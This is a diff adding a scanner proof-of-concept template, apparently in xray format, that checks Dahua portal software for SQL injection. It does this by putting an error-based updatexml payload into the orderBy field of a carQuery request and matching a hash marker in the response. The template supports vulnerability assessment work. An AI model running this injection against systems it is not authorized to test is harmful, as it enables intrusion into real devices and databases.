@@ -1,0 +1,10 @@
+name: poc-yaml-dahua-portal-sqli
+rules:
+  - method: GET
+    path: /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B"orderBy":"1%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--"%7D/extend/%7B%7D
+    expression: |
+      response.body.bcontains(b'1e469dbcb9211897b5f5ebf866c66f3')
+detail:
+  author: dahua-portal-sqli
+  links:
+    - https://www.baidu.com
